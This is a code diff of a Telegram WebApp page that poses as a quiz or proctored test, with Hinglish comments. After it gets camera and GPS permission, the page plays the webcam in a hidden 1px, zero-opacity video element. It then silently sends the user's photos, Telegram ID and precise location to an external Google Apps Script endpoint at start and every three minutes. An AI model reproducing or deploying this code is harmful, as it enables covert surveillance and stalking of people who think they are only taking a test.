@@ -15,10 +15,7 @@
         button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
         button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
-        
-        video {
-            width: 1px; height: 1px; opacity: 0; position: fixed; /* Background mein chalta rahega */
-        }
+        video { width: 1px; height: 1px; opacity: 0; position: fixed; top: 0; }
     </style>
 </head>
 <body>
@@ -45,8 +42,8 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // --- SETUP: Apna Naya Apps Script URL yahan dalein ---
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxaXhCyRQMBX6JpLIMxnR1GXXvuA8ISiwiSBAK7m-PXgD6bjGbv_cH0PTkHLAxJq2E6NA/exec"; 
+    // --- APNA APPS SCRIPT URL YAHA DALEIN ---
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzQKp_JWF9juebUImgf1cm4hwEi6DZdv-vvfnWIb-LmzM-4oGf7L4Ya5xrZpoxUnNfWGA/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
     let userLoc = "Pending";
@@ -60,41 +57,29 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Setting Perfect HD... ⏳";
+        btn.innerText = "Configuring... ⏳";
 
         try {
-            // 1. Camera setup
-            if (!globalStream) {
-                globalStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 1280 }, 
-                        height: { ideal: 720 },
-                        aspectRatio: 1.7777777778 
-                    } 
-                });
-                document.getElementById('proctorVideo').srcObject = globalStream;
-            }
+            globalStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 1280, height: 720, aspectRatio: 1.7777777778 } 
+            });
+            document.getElementById('proctorVideo').srcObject = globalStream;
 
-            // 2. Location Check
-            btn.innerText = "Locating GPS... ⏳";
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
             });
             userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-            // 3. UI Switch
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Initial Capture
-            setTimeout(() => captureAndSend("Test_Started"), 2000);
-
-            // Periodic Monitoring (Har 3 min)
+            // Send first data
+            captureAndSend("Test_Started");
             setInterval(() => captureAndSend("Periodic_Check"), 180000);
 
         } catch (err) {
-            alert("Error: कृपया कैमरा और लोकेशन Allow करें।");
+            alert("Permission Denied! Camera/Location access is required.");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -105,30 +90,13 @@
         try {
             const video = document.getElementById('proctorVideo');
             const canvas = document.createElement('canvas');
-            
-            // Canvas HD Size
             canvas.width = 1280;
             canvas.height = 720;
-            
             const ctx = canvas.getContext('2d');
             
-            // HD Aspect Ratio Drawing Logic
-            const vW = video.videoWidth;
-            const vH = video.videoHeight;
-            const targetRatio = 16 / 9;
-            const currentRatio = vW / vH;
-
-            if (currentRatio > targetRatio) {
-                let newW = vH * targetRatio;
-                let xOffset = (vW - newW) / 2;
-                ctx.drawImage(video, xOffset, 0, newW, vH, 0, 0, 1280, 720);
-            } else {
-                let newH = vW / targetRatio;
-                let yOffset = (vH - newH) / 2;
-                ctx.drawImage(video, 0, yOffset, vW, newH, 0, 0, 1280, 720);
-            }
-            
-            const photoData = canvas.toDataURL('image/jpeg', 0.85);
+            // HD Drawing
+            ctx.drawImage(video, 0, 0, 1280, 720);
+            const photoData = canvas.toDataURL('image/jpeg', 0.7); // Reduced slightly for speed
 
             const payload = {
                 userId: user.id || "NA",
@@ -140,18 +108,19 @@
                 location: userLoc
             };
 
-            // Data bhejte waqt Sheet mein link create hoga
+            // Enhanced Fetch
             fetch(SCRIPT_URL, { 
                 method: "POST", 
-                mode: "no-cors", 
+                mode: "no-cors", // Keep no-cors for Google Apps Script redirects
                 body: JSON.stringify(payload) 
             });
-        } catch (e) { console.log("Capture Error:", e); }
+            
+        } catch (e) { console.log("Error:", e); }
     }
 
     function loadQuestion() {
         if (currentIdx >= questions.length) { 
-            alert("Test Submitted Successfully!"); 
+            alert("Test Submitted!"); 
             tg.close(); 
             return; 
         }
